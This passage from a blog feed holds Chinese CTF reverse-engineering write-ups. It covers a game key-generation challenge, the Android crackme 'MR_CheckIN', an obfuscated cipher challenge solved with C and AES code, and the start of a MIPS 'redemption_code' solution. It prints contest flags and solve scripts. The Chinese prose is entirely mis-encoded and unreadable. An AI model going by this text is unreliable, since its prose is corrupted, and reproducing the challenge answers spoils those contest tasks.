ï¼Œå‘ç°æœ‰å–å‡ºé‚£8å­—èŠ‚æ•°æ®ä½œä¸ºkeyå»å»è¿›è¡Œrc4è§£å¯†ï¼Œä»¥ä¸ºæœ‰ç›´æ¥æ¯”è¾ƒkeyæ˜¯å¦æ­£ç¡®çš„åœ°æ–¹ï¼Œä½†å¹¶æ²¡æœ‰å‘ç°ã€‚ç„¶ååˆè€è€å®å®å®šä½åˆ°è®¡ç®—ç”Ÿæˆkeyçš„åœ°æ–¹ï¼š</p><p><img src="https://i.loli.net/2021/04/12/RC47oJFqrIK2vaN.png" alt="image-20210412184108621"></p><p>ä¸Šé¢çš„ç®—æ³•ä¸­æœ‰ä¸€ä¸ªæœªçŸ¥é‡ï¼Œv0ï¼Œå°±æ˜¯è¦è¿è¡Œçš„æ¬¡æ•°ï¼Œï¼Œæˆ‘æ˜¯æŠŠ1-64éƒ½æ‰“å°äº†å‡ºæ¥ï¼Œåœ¨v0 == 8æ—¶ï¼Œå¾—åˆ°æ­£ç¡®çš„ç»“æœã€‚</p><p>æœ€åå°±æ˜¯æ‰“å°å‡ºæ˜Ÿæ˜Ÿæ•°ä¸º105æ—¶çš„ç›®æ ‡å€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> init[] = &#123;<span class="number">0x4E</span>, <span class="number">0x51</span>, <span class="number">0x14</span>, <span class="number">0xA1</span>, <span class="number">0xFA</span>, <span class="number">0xEE</span>, <span class="number">0xDB</span>, <span class="number">0xEA</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__int64 v2, v3, v4;</span><br><span class="line"><span class="keyword">char</span> v5;</span><br><span class="line"><span class="keyword">unsigned</span> __int64 v6;</span><br><span class="line">__int64 result;</span><br><span class="line"><span class="keyword">int</span> v0 = <span class="number">8</span>, i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    v4 = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v5 = v3++ &amp; <span class="number">0x3f</span>;</span><br><span class="line">v6 = v4 &amp; (*((__int64 *)init));</span><br><span class="line">v4 = (v4 &lt;&lt; <span class="number">1</span>) | (v4 &gt;&gt; <span class="number">63</span>);</span><br><span class="line">v2 ^= v6 &gt;&gt; v5; </span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">while</span>(v3 &lt; <span class="number">64</span>);</span><br><span class="line"></span><br><span class="line">result = v2 | <span class="number">2</span>* (*((__int64 *)init));</span><br><span class="line">(*((__int64 *)init)) = result;</span><br><span class="line"></span><br><span class="line">--v0;</span><br><span class="line">&#125;<span class="keyword">while</span>(v0);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">3</span>; i &lt;= <span class="number">105</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">fun();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%x "</span>, init[j]);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//dd b7 d5 3b 45 51 84 ea</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹æ¸¸æˆå†…å­˜ï¼Œå¾—åˆ°flagã€‚</p><p><img src="https://i.loli.net/2021/04/12/p2RIdzDjMWwXZqG.png" alt="image-20210412184539407"></p><h3 id="MR-CheckIN"><a href="#MR-CheckIN" class="headerlink" title="MR_CheckIN"></a>MR_CheckIN</h3><p>å®‰å“é¢˜ï¼Œjebåç¼–è¯‘åï¼Œåœ¨MainActivityçš„onCreateæ–¹æ³•æ‰¾åˆ°è°ƒç”¨äº†ä¸€ä¸ªç›‘å¬æ–‡æœ¬æ¡†è¾“å…¥çš„ç±»ã€‚ä¹Ÿå°±æ˜¯å½“æˆ‘ä»¬è¾“å…¥passwordé•¿åº¦ä¸º39æ—¶æ‰å°†SIGNINæŒ‰é’®å¯åŠ¨ã€‚ã€‚</p><p><img src="https://i.loli.net/2021/04/12/RKEgf5mp1rlGXyQ.png" alt="image-20210412185333718"></p><p>åé¢å°±æ˜¯å¤„ç†ä»æ–‡æœ¬æ¡†è¾“å…¥çš„å†…å®¹ï¼Œusernameè¦ä¸ºMRCTFï¼Œç„¶åæ£€æŸ¥äº†passwordçš„æ ¼å¼MRCTF{}ï¼Œæ¥ç€passwdçš„6-13è¿›è¡Œmd5åŠ å¯†åä¸ç¼–ç çš„æ•°æ®æ¯”è¾ƒï¼Œè¿™ä¸ªåœ¨çº¿è§£å¯†ä¸€ä¸‹å°±å¥½äº†ï¼š<strong>Andr01d</strong>ï¼Œå‰©ä¸‹çš„æ•°æ®ä¼ å…¥check2å‡½æ•°è¿›è¡Œè¿ç®—æ£€æŸ¥ã€‚</p><p><img src="https://i.loli.net/2021/04/12/rtjRiSdXNP5Klcg.png" alt="image-20210412185731359"></p><p>check2å‡½æ•°å°±æ˜¯ç”Ÿæˆä¸€ä¸ªå¯†é’¥åºåˆ—ç„¶åä¸è¾“å…¥å¼‚æˆ–åä¸ç¼–ç æ•°æ®æ¯”è¾ƒï¼š<br><img src="https://i.loli.net/2021/04/12/r5QGPNgA2azXcWR.png" alt="image-20210412190659182"></p><p>æˆ‘å¼€å§‹ç›´æ¥æŠŠä¸Šé¢ç”Ÿæˆå¯†é’¥åºåˆ—çš„nextæ–¹æ³•å¤åˆ¶åˆ°javaä¸­è¿è¡Œï¼Œä½†å¾—åˆ°å¯†é’¥åºåˆ—ä¸€ç›´ä¸å¯¹ã€‚ã€‚</p><p>ç„¶åç”¨äº†æœ€ç¬¨çš„æ–¹æ³•ï¼Œï¼Œå•æ­¥è°ƒè¯•ä¸€æ­¥ä¸€æ­¥å¾—åˆ°å¯†é’¥åºåˆ—ï¼Œå…¶å®æŠŠæœ€åé‚£ä¸ªåˆ¤æ–­æ¡ä»¶æ”¹ä¸€ä¸‹ï¼Œå¾—åˆ°è¿™ä¸ªåºåˆ—å°±æ–¹ä¾¿äº†ã€‚ã€‚</p><p>å¯†é’¥åºåˆ—ï¼š<strong>[49, 49, 49, 50, 53, 52, 55, 48, 54, 48, 53, 48, 48, 52, 48, 48, 48, 53, 50, 48, 49, 48, 48, 48, 48]</strong></p><p>æœ€åå¼‚æˆ–ä¸€ä¸‹ï¼š</p><p><img src="https://i.loli.net/2021/04/12/sGjmcnix6TPkBAq.png" alt="image-20210412191628542"></p><h3 id="å¤ç¥çš„ä½è¯­"><a href="#å¤ç¥çš„ä½è¯­" class="headerlink" title="å¤ç¥çš„ä½è¯­"></a>å¤ç¥çš„ä½è¯­</h3><p>é­”æ”¹è¿‡çš„å¹³å¦åŒ–æ··æ·†ï¼Œï¼Œç”¨è„šæœ¬æ²¡å»æ‰ï¼Œç„¶åå°±æ˜¯ç¡¬çœ‹äº†ã€‚ã€‚</p><p><img src="https://i.loli.net/2021/04/14/mJj6gvVdWCaYAhw.png" alt="image-20210413181523944"></p><p>å¼€å§‹å¯¹è¾“å…¥çš„ä¸€äº›æ“ä½œï¼Œåˆ¤æ–­é•¿åº¦å’Œå¯¹usernameè¿›è¡Œbytes.fromhex()çš„æ“ä½œã€‚</p><p><img src="https://i.loli.net/2021/04/12/EW7mQ3A2kHTtMJc.png" alt="image-20210412193243190"></p><p>ä¹‹åå°±æ˜¯é‚£ä¸ªå¾ˆå¤§çš„å‡½æ•°äº†ï¼Œè®°ä¸ºmixFuctionï¼Œä¹Ÿæ˜¯æ•´ä¸ªé¢˜çš„å…³é”®ï¼Œï¼Œä»€ä¹ˆæ“ä½œéƒ½è°ƒç”¨äº†å®ƒã€‚</p><p>é¦–å…ˆç¬¬ä¸€æ¬¡è°ƒè¯•çš„æ—¶å€™ï¼Œåœ¨å†…å­˜ä¸­æ‰¾åˆ°äº†äºŒå¼ è¡¨ï¼Œæœç´¢åˆ°è¿™æ˜¯ç¥–å†²ä¹‹åºåˆ—å¯†ç ï¼Œæœ‰å¯†é’¥ä¸ivã€‚å†ä»”ç»†åˆ†æç¬¬ä¸€æ¬¡è°ƒç”¨é‚£ä¸ªmixFuctionå‡½æ•°ï¼Œå‘ç°ä¼ å…¥usernameçš„hex.decodeçš„å½¢å¼å’Œezivforefolwencï¼ŒçŒœæµ‹è¿™æ˜¯å°†usernameä½œä¸ºkeyï¼Œezivforefolwencä½œä¸ºivï¼Œè¿›è¡Œç¥–å†²åºåˆ—å¯†ç çš„åˆå§‹åŒ–ã€‚</p><p>ç„¶åç¬¬äºŒæ¬¡è°ƒç”¨mixFunctionï¼Œä¼ å…¥å‚æ•°8å’Œä¸€ä¸ªæŒ‡é’ˆï¼Œå•æ­¥æ­¥è¿‡è¿™ä¸ªå‡½æ•°å‘ç°ç”Ÿæˆ32å­—èŠ‚æ•°æ®ï¼Œä»ä¼ å…¥çš„å‚æ•°ä¸º8ï¼Œå’Œè¿™ä¸ªåºåˆ—å¯†ç çš„ç”Ÿæˆå¯†é’¥æµçš„æ€§è´¨ï¼š32ä½4å­—èŠ‚å¯†é’¥ä¸ºä¸€ä¸ªç”Ÿæˆå•å…ƒã€‚æˆ‘åˆè‡ªå·±ç”¨è¿™ä¸ªç›¸åŒçš„å¯†é’¥å’Œivæ¨¡æ‹Ÿäº†ç”Ÿæˆçš„å¯†é’¥ï¼Œç„¶åå¯¹æ¯”ï¼Œï¼Œæœç„¶ä¸€æ ·ã€‚ã€‚</p><p><img src="https://i.loli.net/2021/04/12/yiX6IH4obUWvgTM.png" alt="image-20210412194741393"></p><p>æ¥ç€è°ƒç”¨çš„ä¸€ä¸ªmixFunctionè¿›è¡Œäº†èµ‹å€¼æ“ä½œï¼Œç›´æ¥å•æ­¥æ­¥è¿‡åçœ‹å˜åŒ–ã€‚</p><p>ç»§ç»­åˆè°ƒç”¨çš„ä¸¤æ¬¡mixFunctionä¼ å…¥ä¸€ä¸ªkeyå’Œè¾“å…¥çš„passwdï¼Œåˆ†2æ¬¡åŠ å¯†ï¼Œæ¯æ¬¡åŠ å¯†16å­—èŠ‚ï¼Œåˆ†ç»„å¯†ç çš„ç‰¹å¾äº†ã€‚å•æ­¥æ­¥å…¥è°ƒè¯•mixFunctionå¾ˆå¡ï¼Œï¼Œç›´æ¥å¯¹passwdä¸‹å†…å­˜è®¿é—®æ–­ç‚¹ï¼Œå‘ç°å¼€å§‹ç”¨ä¼ å…¥çš„keyå’Œpasswdè¿›è¡Œä¸€ä¸ªå¼‚æˆ–æ“ä½œï¼Œç»§ç»­F9ï¼Œåˆæ–­ä¸‹æ¥ï¼Œï¼Œä¸€ä¸ªå­—èŠ‚æ›¿æ¢æ“ä½œï¼Œè€Œä»ç›’å­çœ‹ï¼Œæ˜æ˜¾aesçš„sç›’ï¼Œå“ˆå“ˆè¢«å‘ç°äº†ï¼Œé‚£ä¹‹å‰å°±æ˜¯åˆå§‹è½®äº†ã€‚</p><p>åé¢æ˜¯ç”¨ä¹‹å‰ç”Ÿæˆçš„å¯†é’¥æµåŠ å¯†ï¼š</p><p><img src="https://i.loli.net/2021/04/12/65g7iN1jonLYG2D.png" alt="image-20210412200958875"></p><p>å…¶ä¸­åˆè°ƒç”¨äº†mixFunctionå‡½æ•°å¯¹å¯†é’¥æµè¿›è¡Œä¸€ä¸ªåºåˆ—æ“ä½œï¼Œè°ƒè¯•åˆ°å…³é”®ä½ç½®ï¼Œå¾—åˆ°åŠ å¯†ç®—æ³•ã€‚</p><p><img src="https://i.loli.net/2021/04/12/oG3p7UKMH2av6BN.png" alt="image-20210412202528482"></p><p>æœ€åè¿˜æœ‰ä¸€ä¸ªmixFunctionï¼šå¾ªç¯ç§»ä½æ“ä½œã€‚</p><p><img src="https://i.loli.net/2021/04/12/b72eDcHfSz43XPd.png" alt="image-20210412203433118"></p><p>æœ€åæ•´ä½“ä¸Šï¼Œæ•´ä¸ªåŠ å¯†å°±ç±»ä¼¼teaç»“æ„ï¼Œè§£å¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>][<span class="number">256</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ENC[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">208</span>, <span class="number">161</span>, <span class="number">129</span>, <span class="number">188</span>, <span class="number">124</span>, <span class="number">155</span>,   <span class="number">2</span>, <span class="number">228</span>,  <span class="number">47</span>,  <span class="number">51</span>, </span><br><span class="line">   <span class="number">54</span>, <span class="number">232</span>, <span class="number">187</span>,  <span class="number">18</span>, <span class="number">146</span>, <span class="number">244</span>,  <span class="number">18</span>, <span class="number">178</span>, <span class="number">177</span>, <span class="number">115</span>, </span><br><span class="line">  <span class="number">243</span>, <span class="number">219</span>, <span class="number">248</span>, <span class="number">195</span>, <span class="number">252</span>, <span class="number">223</span>, <span class="number">212</span>,  <span class="number">80</span>, <span class="number">220</span>, <span class="number">140</span>, </span><br><span class="line">   <span class="number">91</span>, <span class="number">233</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> enc_stream[] = &#123;<span class="number">3691317505</span>, <span class="number">783378847</span>, <span class="number">3109790973</span>, <span class="number">2450366240</span>,</span><br><span class="line"> <span class="number">1882631107</span>, <span class="number">1581884682</span>, <span class="number">2916488768</span>, <span class="number">1817239551</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">mul_2</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">cnt += ((a&gt;&gt;i)&amp;<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf("%d", cnt);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(cnt%<span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> a*<span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> ((a*<span class="number">2</span>) | <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gen_key</span><span class="params">(<span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i, j, v43, v44;</span><br><span class="line"></span><br><span class="line">v44 = enc_stream[<span class="number">2</span>*index], v43 = enc_stream[<span class="number">2</span>*index+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">v44 = mul_2(v43);</span><br><span class="line">v43 = mul_2(v44);</span><br><span class="line"></span><br><span class="line">key[index][i][<span class="number">0</span>] = v44 &gt;&gt; <span class="number">7</span>;</span><br><span class="line">key[index][i][<span class="number">1</span>] = v43 &lt;&lt; <span class="number">18</span>;</span><br><span class="line">key[index][i][<span class="number">2</span>] = v43 &gt;&gt; <span class="number">7</span>;</span><br><span class="line">key[index][i][<span class="number">3</span>] = v44 &lt;&lt; <span class="number">18</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">ror</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a, <span class="keyword">unsigned</span> <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ans = (a &gt;&gt; i) | (a &lt;&lt; (<span class="number">0x20</span>-i));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ans; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">gen_key(i);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> tmp;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *enc = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ENC+<span class="number">8</span>*i);</span><br><span class="line">tmp = enc[<span class="number">1</span>];</span><br><span class="line">enc[<span class="number">1</span>] = enc[<span class="number">0</span>];</span><br><span class="line">enc[<span class="number">0</span>] ^= tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">255</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line">enc[<span class="number">1</span>] += ror(enc[<span class="number">0</span>], j&amp;<span class="number">0x1f</span>) ^ key[i][j][<span class="number">1</span>] | key[i][j][<span class="number">0</span>];</span><br><span class="line">enc[<span class="number">0</span>] += ror(enc[<span class="number">1</span>], j&amp;<span class="number">0x1f</span>) ^ key[i][j][<span class="number">3</span>] | key[i][j][<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf("%x ", ror(0x00C68E92E3, 2));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d, "</span>, ENC[i]); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>aesè§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>cry = AES.new(<span class="string">b"ezkeyforenc"</span>+bytes(<span class="number">5</span>), AES.MODE_ECB)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = cry.decrypt(bytes([<span class="number">138</span>, <span class="number">103</span>, <span class="number">149</span>, <span class="number">61</span>, <span class="number">251</span>, <span class="number">35</span>, <span class="number">47</span>, <span class="number">155</span>, <span class="number">4</span>, <span class="number">129</span>, <span class="number">228</span>, <span class="number">119</span>, <span class="number">7</span>, <span class="number">137</span>, <span class="number">132</span>, <span class="number">118</span>, <span class="number">214</span>, <span class="number">137</span>, <span class="number">47</span>, <span class="number">233</span>, <span class="number">229</span>, <span class="number">148</span>, <span class="number">23</span>, <span class="number">181</span>, <span class="number">45</span>, <span class="number">203</span>, <span class="number">80</span>, <span class="number">45</span>, <span class="number">251</span>, <span class="number">101</span>, <span class="number">6</span>, <span class="number">224</span>]))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag</span><br><span class="line"><span class="string">b'really_ez_flatten_obfu_can_u_fix'</span></span><br></pre></td></tr></table></figure><p>æœ€åè§£å¯†è¿˜åŸå¾—åˆ°çš„ä¸€ä¸ªéŸ³é¢‘æ–‡ä»¶ï¼Œè¿™ä¸æ‚é¡¹ã€‚ã€‚</p><p>æ‰¾åˆ°è¿™ä¸ªï¼š</p><p><img src="https://i.loli.net/2021/04/12/JcSsjlAgELORaku.png" alt="image-20210412203830511"></p><p>ç„¶åï¼Œï¼Œï¼Œå€’æ”¾éŸ³é¢‘å¬åˆ°flagã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›è™ç¬¦ç½‘ç»œå®‰å…¨</title>
      <link href="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
      <url>/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<p>ç¬¬äºŒå±Šè™ç¬¦CTFï¼Œåˆ†äº«ä¸€ä¸‹é€†å‘é¢˜è§£ã€‚<a id="more"></a></p><blockquote><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/15CH8WMsHoaRmMeIflV3Llg" target="_blank" rel="noopener">https://pan.baidu.com/s/15CH8WMsHoaRmMeIflV3Llg</a><br>æå–ç ï¼šz531<br>å¤åˆ¶è¿™æ®µå†…å®¹åæ‰“å¼€ç™¾åº¦ç½‘ç›˜æ‰‹æœºAppï¼Œæ“ä½œæ›´æ–¹ä¾¿å“¦</p></blockquote><h3 id="redemption-code"><a href="#redemption-code" class="headerlink" title="redemption_code"></a>redemption_code</h3><p>32ä½mipsæ¶æ„åŠ¨æ€é“¾æ¥çš„ç¨‹åºã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403195047229.png" alt="image-20210403195047229"></p><p>å› ä¸ºåŠ¨æ€é“¾æ¥è¿è¡Œè¦æŒ‡å®šåº“è·¯å¾„ï¼Œè¿™é‡Œå°±ç›´æ¥é™æ€åˆ†æï¼Œè¿™ä¸ªé¢˜ä¹Ÿè¶³å¤Ÿäº†ã€‚</p><p>é¦–å…ˆçœ‹åˆ°å¯¹è¾“å…¥å­—ç¬¦ä¸²å¤„ç†çš„ç¬¬ä¸€ä¸ªå‡½æ•°preï¼šåˆ¤æ–­é•¿åº¦åï¼Œä¸€ä¸ªå­—ç¬¦ä¸²èµ‹å€¼æ“ä½œï¼Œä¸€èµ·ä¼ å…¥checkã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403200825059.png" alt="image-20210403200825059"></p><p>ç„¶åserver_check_redemption_codeå‡½æ•°ï¼šåˆ›å»º14ä¸ªè¡¨ï¼Œç„¶åæˆ‘ä»¬çš„è¾“å…¥çš„å­—ç¬¦ä¸²ä½œä¸ºindexåœ¨å…¶ä¸­ä»¥æ­¤é€’å¢çš„åšæ ‡è®°ã€‚æœ€åç”¨ä¸Šé¢èµ‹å€¼çš„å­—ç¬¦ä¸²ä½œä¸ºindexä¾æ¬¡æŸ¥è¡¨ï¼Œç›´åˆ°åˆ°æœ€ååˆ°è¾¾æœ€åä¸€ä¸ªè¡¨æ‰æˆåŠŸã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403201314116.png" alt="image-20210403201314116"></p><p>ä¸Šé¢å¦‚æœä¸å¥½ç†è§£çš„è¯ï¼Œå¯ä»¥æŠŠè¦å¾—åˆ°çš„è¡¨æ‰“å°å‡ºæ¥çœ‹ä¸€ä¸‹å°±æ¸…æ¥šäº†ã€‚</p><p>æ‰€ä»¥è¯´ï¼Œè¦ä½¿ç¬¬ä¸€ä¸ªå‡½æ•°ä¸è¿”å›-1ï¼Œåªè¦æˆ‘ä»¬çš„è¾“å…¥ä¸ºèµ‹å€¼å­—ç¬¦ä¸²çš„å‰14ä¸ªå°±å¥½äº†ã€‚<strong>Ninja Must Die</strong></p><p>ç´§æ¥ç€ï¼Œåˆæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²èµ‹å€¼æ“ä½œåŠ ä¸€ä¸ªcheck()å‡½æ•°ï¼Œä¸å‰é¢ä¸åŒçš„æ˜¯è¿™ä¸ªcheck()å‡½æ•°çš„è¿”å›å€¼è¦ä¸º7ï¼Œè®¡ç®—å¯ä»¥çŸ¥é“ä¹Ÿå°±æ˜¯check()å‡½æ•°æœ€åè¦å¯»æ‰¾21é•¿åº¦çš„å­—ç¬¦ä¸²ã€‚è€Œèµ‹å€¼çš„å­—ç¬¦ä¸²ä¹Ÿå˜äº†ï¼Œå¦‚ä½•è®©æˆ‘ä»¬çš„è¾“å…¥å­—ç¬¦ä¸²æ»¡è¶³2ä¸ªcheck()å‡½æ•°å‘¢ã€‚</p><p>è§‚å¯Ÿä¸€ä¸‹ç¬¬äºŒä¸ªå­—ç¬¦ä¸²çš„å‰21ä½ï¼š<strong>I Love Ninja Must 